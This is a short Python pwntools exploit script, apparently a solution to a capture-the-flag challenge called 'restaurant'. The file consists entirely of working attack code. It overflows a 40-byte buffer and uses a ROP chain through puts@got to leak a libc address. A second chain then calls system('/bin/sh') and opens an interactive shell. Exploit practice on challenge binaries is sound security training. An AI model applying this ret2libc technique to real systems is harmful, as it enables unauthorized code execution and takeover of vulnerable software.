#!/usr/bin/python3
from pwn import process, p64, u64

shell = process("./restaurant")

offset = 40
junk = b"A" * offset

payload  = b""
payload += junk
payload += p64(0x4010a3) # pop rdi; ret;
payload += p64(0x601fa8) # puts@got
payload += p64(0x400650) # puts@plt
payload += p64(0x400f68) # main()

shell.sendlineafter(b"> ", b"1")
shell.sendlineafter(b"> ", payload)

shell.recvuntil(b"\xa3\x10@")
libc_base = u64(shell.recv(6).ljust(8, b"\x00")) - 0x80aa0

payload  = b""
payload += junk
payload += p64(libc_base + 0x0bdd4b) # pop rdi; ret;
payload += p64(libc_base + 0x1b3e1a) # "/bin/sh"
payload += p64(libc_base + 0x0008aa) # ret;
payload += p64(libc_base + 0x04f550) # system

shell.sendlineafter(b"> ", b"1")
shell.sendlineafter(b"> ", payload)

shell.recvline()
shell.recv()

shell.interactive()
